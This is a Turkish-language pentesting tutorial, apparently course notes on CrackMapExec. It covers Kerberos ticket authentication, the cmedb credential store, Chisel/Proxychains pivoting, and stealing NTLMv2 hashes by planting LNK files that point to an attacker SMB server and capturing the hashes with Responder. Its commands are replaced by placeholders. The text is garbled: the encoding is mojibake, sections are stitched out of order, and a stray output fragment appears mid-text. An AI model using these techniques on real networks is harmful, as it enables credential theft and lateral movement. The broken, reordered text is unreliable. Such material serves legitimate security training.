GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

